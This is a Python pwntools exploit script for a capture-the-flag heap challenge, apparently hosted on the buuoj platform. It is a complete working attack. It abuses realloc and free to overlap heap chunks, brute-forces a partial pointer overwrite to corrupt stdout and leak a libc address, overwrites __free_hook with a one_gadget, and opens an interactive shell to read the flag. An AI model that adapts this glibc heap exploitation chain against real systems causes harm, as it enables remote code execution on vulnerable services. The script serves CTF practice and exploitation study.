from pwn import *
from LibcSearcher import LibcSearcher
import click
import sys
import os
import time
import functools

FILENAME = '#' # 要执行的文件名
DEBUG = 1 # 是否为调试模式
TMUX = 0 # 是否开启TMUX
GDB_BREAKPOINT = None # 当tmux开启的时候，断点的设置
IP = None # 远程连接的IP
PORT = None # 远程连接的端口
LOCAL_LOG = 1 # 本地LOG是否开启
PWN_LOG_LEVEL = 'debug' # pwntools的log级别设置
STOP_FUNCTION = 1 # STOP方法是否开启


CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])

@click.command(context_settings=CONTEXT_SETTINGS, short_help='Do pwn!')
@click.argument('filename', nargs=1, type=str, required=0, default=None)
@click.option('-d', '--debug', default=True, type=bool, nargs=1, help='Excute program at local env or remote env. Default value: True.')
@click.option('-t', '--tmux', default=False, type=bool, nargs=1, help='Excute program at tmux or not. Default value: False.')
@click.option('-gb', '--gdb-breakpoint', default=None, type=str, help='Set a gdb breakpoint while tmux is enabled, is a hex address or a function name. Default value:None')
@click.option('-i', '--ip', default=None, type=str, nargs=1, help='The remote ip addr. Default value: None.')
@click.option('-p', '--port', default=None, type=int, nargs=1, help='The remote port. Default value: None.')
@click.option('-ll', '--local-log', default=True, type=bool, nargs=1, help='Set local log enabled or not. Default value: True.')
@click.option('-pl', '--pwn-log', type=click.Choice(['debug', 'info', 'warn', 'error', 'notset']), nargs=1, default='debug', help='Set pwntools log level. Default value: debug.')
@click.option('-sf', '--stop-function', default=True, type=bool, nargs=1, help='Set stop function enabled or not. Default value: True.')
def parse_command_args(filename, debug, tmux, gdb_breakpoint, ip, 
                       port, local_log, pwn_log, stop_function):
    '''FILENAME: The filename of current directory to pwn'''
    global FILENAME, DEBUG, TMUX, GDB_BREAKPOINT, IP, PORT, LOCAL_LOG, PWN_LOG_LEVEL, STOP_FUNCTION
    # assign
    FILENAME = filename
    DEBUG = debug
    TMUX = tmux
    GDB_BREAKPOINT = gdb_breakpoint
    IP = ip
    PORT = port
    LOCAL_LOG = local_log
    PWN_LOG_LEVEL = pwn_log
    STOP_FUNCTION = stop_function
    # print('[&]', filename, debug, tmux, gdb_breakpoint, ip, port, local_log, pwn_log, stop_function)
    # change
    if PORT:
        DEBUG = 0
        TMUX = 0
        STOP_FUNCTION = 0
        GDB_BREAKPOINT = None
        if IP is None:
            IP = 'node3.buuoj.cn'
    
    if DEBUG:
        IP = None
        PORT = None
    
    # assert
    assert not (FILENAME is None and PORT is None), 'para error'
    assert not (FILENAME is None and DEBUG == 1), 'para error'
    assert not (PORT is not None and DEBUG == 1), 'para error'
    assert not (DEBUG == 0 and TMUX == 1), 'para error'
    
    # print
    click.echo('=' * 50)
    click.echo(' [+] Args info:\n')
    if FILENAME:
        click.echo('  filename: %s' % FILENAME)
    click.echo('  debug enabled: %d' % DEBUG)
    click.echo('  tmux enabled: %d' % TMUX)
    if GDB_BREAKPOINT:
        click.echo('  gdb breakpoint: %s' % GDB_BREAKPOINT)
    if IP:
        click.echo('  remote ip: %s' % IP)
    if PORT:
        click.echo('  remote port: %d' % PORT)
    click.echo('  local log enabled: %d' % LOCAL_LOG)
    click.echo('  pwn log_level: %s' % PWN_LOG_LEVEL)
    click.echo('  stop function enabled: %d' % STOP_FUNCTION)
    click.echo('=' * 50)
    

parse_command_args.main(standalone_mode=False)

if len(sys.argv) == 2 and sys.argv[1] == '--help':
    sys.exit(0)

if DEBUG:
    io = process('./{}'.format(FILENAME))
else:
    io = remote(IP, PORT)

if TMUX:
    context.update(terminal=['tmux', 'splitw', '-h'])
    if GDB_BREAKPOINT is None:
        gdb.attach(io)
    elif '0x' in GDB_BREAKPOINT:
        gdb.attach(io, gdbscript='b *{}\nc\n'.format(GDB_BREAKPOINT))
    else:
        gdb.attach(io, gdbscript='b {}\nc\n'.format(GDB_BREAKPOINT))


if FILENAME:
    cur_elf = ELF('./{}'.format(FILENAME))
    print('[+] libc used ===> {}'.format(cur_elf.libc))

def LOG_ADDR(addr_name:str, addr:int):
    if LOCAL_LOG:
        log.success("{} ===> {}".format(addr_name, hex(addr)))
    else:
        pass

STOP_COUNT = 0
def STOP(idx:int=-1):
    if not STOP_FUNCTION:
        return
    if idx != -1:
        input("stop...{} {}".format(idx, proc.pidof(io)))
    else:
        global STOP_COUNT
        input("stop...{}  {}".format(STOP_COUNT, proc.pidof(io)))
        STOP_COUNT += 1

int16 = functools.partial(int, base=16)

context.update(os='linux', log_level=PWN_LOG_LEVEL, arch='amd64',endian='little')
##########################################
##############以下为攻击代码###############
##########################################

# realloc的特点
def re(size:int=0, content:bytes=b'\x00'):
    global io
    io.sendlineafter(">> ", '1')
    io.sendlineafter("Size?\n", str(size))
    io.recvuntil("Content?\n")
    if size > 0:
        io.send(content)
    return io.recvuntil("Done\n")

def fr():
    global io
    io.sendlineafter(">> ", '2')
    io.recvuntil("Done\n")

restraint = 1
def ba():
    global io, restraint
    if restraint == 0:
        return
    io.sendlineafter(">> ", '666')
    io.recvuntil("Done\n")
    restraint -= 1


def do(des:int):
    global io
    assert des >= 0 and des <= 0xff,'error!'
    time.sleep(3)
    re(0x30)# 首先申请/释放 为后面覆盖写做准备
    re(0) # 释放，并把指针置为空
    re(0x80) # 申请
    re(0) # 释放置空
    re(0x40)
    re(0) # 置0 隔开topchunk

    re(0x80)

    for x in range(7):
        fr()

    re(0) # unsorted bin overlapping

    re(0x30) # 取出来

    # 修改两个字节 最低的一个字节是 0x60

    des = (des << 8) + 0x60

    re(0x50, p64(0) * 7 + p64(0x51) + p16(des)) # 踩低字节
    re(0)

    re(0x80)
    re(0)
    try:
        msg = re(0x80, p64(0x0FBAD1887) + p64(0) * 3 + p8(0x58))
        leak_addr = u64(msg[:8])
    except:
        try:
            io.close()
        except:
            pass
        finally:
            if DEBUG:
                io = process('./{}'.format(FILENAME))
            else:
                io = remote(IP, PORT)
        return
    print(' [*] Success!!!')
    time.sleep(5)
    free_hook_addr = leak_addr + 0x5648
    LOG_ADDR('free_hook_addr', free_hook_addr)

    gadget = [0x4f2c5, 0x4f322, 0x10a38c]
    one_gadget = free_hook_addr - 0x3ed8e8 + gadget[1]

    ba()

    re(0x10)
    re(0)

    re(0x90)
    re(0)

    re(0x20)
    re(0)

    # 开始dump0x90
    re(0x90)
    for x in range(7):
        fr()

    re(0)

    re(0x10)
    re(0x50, p64(0) * 3 + p64(0x51) + p64(free_hook_addr))
    re(0)


    re(0x90)
    re(0)

    re(0x90, p64(one_gadget))

    # delete
    io.sendlineafter(">> ", '2')
    io.sendline('cat flag')
    io.interactive()

if __name__ == '__main__':
    while True:
        do(0xa7)
    